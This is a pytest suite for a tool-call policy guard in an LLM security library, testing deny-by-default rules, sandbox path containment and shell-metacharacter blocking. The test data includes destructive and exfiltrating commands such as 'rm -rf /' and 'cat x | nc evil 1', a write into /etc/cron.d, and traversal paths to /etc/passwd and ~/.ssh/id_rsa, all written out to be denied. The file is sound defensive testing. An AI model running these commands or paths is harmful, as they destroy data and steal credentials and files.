"""Tool-call policy guard (OWASP LLM06): policy, sandbox containment, shell metacharacters."""

from pathlib import Path
from typing import Any

import pytest
from pydantic import JsonValue

from llm_security_shield.schemas import PolicyAction, ToolCall, ToolPolicy
from llm_security_shield.tools import ToolPolicyGuard

DENY = PolicyAction.DENY
ALLOW = PolicyAction.ALLOW
APPROVE = PolicyAction.REQUIRE_APPROVAL


def _decide(guard: ToolPolicyGuard, name: str, **arguments: JsonValue) -> Any:
    return guard.evaluate(ToolCall(name=name, arguments=arguments))


class TestPolicy:
    def test_unknown_tool_denied_by_default(self, policy_guard: ToolPolicyGuard) -> None:
        decision = _decide(policy_guard, "unknown_tool")
        assert decision.action is DENY
        assert "deny by default" in decision.reason

    def test_denied_tool(self, policy_guard: ToolPolicyGuard) -> None:
        assert _decide(policy_guard, "rm", path="data/ok.txt").reason == "tool is denied by policy"

    def test_allowed_tool(self, policy_guard: ToolPolicyGuard) -> None:
        decision = _decide(policy_guard, "read_file", path="data/ok.txt")
        assert decision.action is ALLOW
        assert decision.reason == "allow by tool rule"

    def test_argument_allowlist(self, policy_guard: ToolPolicyGuard) -> None:
        decision = _decide(policy_guard, "read_file", path="data/ok.txt", mode="w")
        assert decision.action is DENY
        assert decision.reason == "arguments not permitted: mode"

    def test_require_approval_preserved(self, policy_guard: ToolPolicyGuard) -> None:
        assert _decide(policy_guard, "run", command="ls -la").action is APPROVE

    def test_permissive_default_still_inspects(self, sandbox: Path) -> None:
        guard = ToolPolicyGuard(ToolPolicy(default_action=ALLOW), sandbox_roots=[sandbox])
        assert _decide(guard, "anything").reason == "allow by default policy"
        assert _decide(guard, "anything", cmd="a|b").action is DENY

    def test_policy_property(self, policy_guard: ToolPolicyGuard, tool_policy: ToolPolicy) -> None:
        assert policy_guard.policy is tool_policy

    def test_per_request_call_limits(self, policy_guard: ToolPolicyGuard) -> None:
        calls = [
            ToolCall(name="search", arguments={"q": "a"}),
            ToolCall(name="search", arguments={"q": "b"}),
            ToolCall(name="run", arguments={"command": "ls"}),
            ToolCall(name="unknown"),
        ]
        decisions = policy_guard.evaluate_all(calls)
        assert [d.action for d in decisions] == [ALLOW, DENY, APPROVE, DENY]
        assert decisions[1].reason == "exceeds 1 call(s) per request"


class TestSandbox:
    @pytest.mark.parametrize(
        "path", ["data/ok.txt", "data/new.txt", "./data/../data/ok.txt", "data"]
    )
    def test_contained_paths(self, policy_guard: ToolPolicyGuard, path: str) -> None:
        assert _decide(policy_guard, "read_file", path=path).action is ALLOW

    def test_absolute_path_inside(self, policy_guard: ToolPolicyGuard, sandbox: Path) -> None:
        path = str(sandbox / "data" / "ok.txt")
        assert _decide(policy_guard, "read_file", path=path).action is ALLOW

    @pytest.mark.parametrize(
        ("path", "reason"),
        [
            ("../../etc/passwd", "path escapes the sandbox"),
            ("data/../../x", "path escapes the sandbox"),
            ("/etc/passwd", "path escapes the sandbox"),
            ("escape/secret", "path escapes the sandbox"),
            ("%2e%2e/%2e%2e/etc/passwd", "path escapes the sandbox"),
            ("data%2f..%2f..%2fx", "path escapes the sandbox"),
            ("..\\..\\win.ini", "backslash separator in path"),
            ("~/.ssh/id_rsa", "home-directory expansion in path"),
            ("data/ok\x00.txt", "NUL byte in path"),
        ],
        ids=[
            "dotdot",
            "nested-dotdot",
            "absolute",
            "symlink-out",
            "percent-encoded",
            "encoded-slash",
            "backslash",
            "home",
            "nul",
        ],
    )
    def test_escapes_denied(self, policy_guard: ToolPolicyGuard, path: str, reason: str) -> None:
        decision = _decide(policy_guard, "read_file", path=path)
        assert decision.action is DENY
        assert decision.reason == f"{reason} in argument 'path'"

    def test_nested_and_case_insensitive_keys(self, policy_guard: ToolPolicyGuard) -> None:
        decision = _decide(policy_guard, "run", options={"CWD": "/"}, flags=[1, True])
        assert decision.reason == "path escapes the sandbox in argument 'cwd'"

    def test_no_sandbox_means_no_filesystem(self, tool_policy: ToolPolicy) -> None:
        guard = ToolPolicyGuard(tool_policy)
        assert _decide(guard, "read_file", path="x").reason.startswith(
            "filesystem access is not permitted"
        )

    def test_unresolvable_path(
        self, policy_guard: ToolPolicyGuard, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        def broken_resolve(_self: Path, *_args: object, **_kwargs: object) -> Path:
            raise OSError("loop")

        monkeypatch.setattr(Path, "resolve", broken_resolve)
        assert _decide(policy_guard, "read_file", path="x").reason.startswith("unresolvable path")

    def test_relative_roots_rejected(self, tool_policy: ToolPolicy) -> None:
        with pytest.raises(ValueError, match="must be absolute"):
            ToolPolicyGuard(tool_policy, sandbox_roots=["relative/dir"])

    def test_multiple_roots(self, tool_policy: ToolPolicy, sandbox: Path, tmp_path: Path) -> None:
        other = tmp_path.resolve() / "other"
        other.mkdir()
        guard = ToolPolicyGuard(tool_policy, sandbox_roots=[sandbox, other])
        assert _decide(guard, "read_file", path=str(other / "f")).action is ALLOW


class TestShellMetacharacters:
    @pytest.mark.parametrize(
        "command",
        [
            "ls; rm -rf /",
            "cat x | nc evil 1",
            "echo `id`",
            "echo $(id)",
            "a && b",
            "ls\nrm -rf /",
            "x > /etc/cron.d/job",
            "sleep 1 &",
        ],
    )
    def test_blocked(self, policy_guard: ToolPolicyGuard, command: str) -> None:
        decision = _decide(policy_guard, "run", command=command)
        assert decision.action is DENY
        assert decision.reason == "shell metacharacters in argument 'command'"
        assert command not in decision.reason

    def test_argv_lists_are_inspected(self, policy_guard: ToolPolicyGuard) -> None:
        assert _decide(policy_guard, "run", Command=["ls", "x > y"]).action is DENY
        assert _decide(policy_guard, "run", command=["ls", "-la", "data"]).action is APPROVE

    def test_nested_command(self, policy_guard: ToolPolicyGuard) -> None:
        decision = _decide(policy_guard, "run", options={"nested": [{"cmd": "a;b"}]})
        assert decision.reason == "shell metacharacters in argument 'cmd'"

    def test_non_command_arguments_untouched(self, policy_guard: ToolPolicyGuard) -> None:
        assert _decide(policy_guard, "search", query="cats; dogs | $5").action is ALLOW

    def test_deep_nesting_does_not_recurse(self, policy_guard: ToolPolicyGuard) -> None:
        deep: dict[str, JsonValue] = {"cmd": "ok"}
        for _ in range(5_000):
            deep = {"x": [deep]}
        call = ToolCall.model_construct(name="run", arguments=deep, call_id=None)
        assert policy_guard.evaluate(call).action is APPROVE
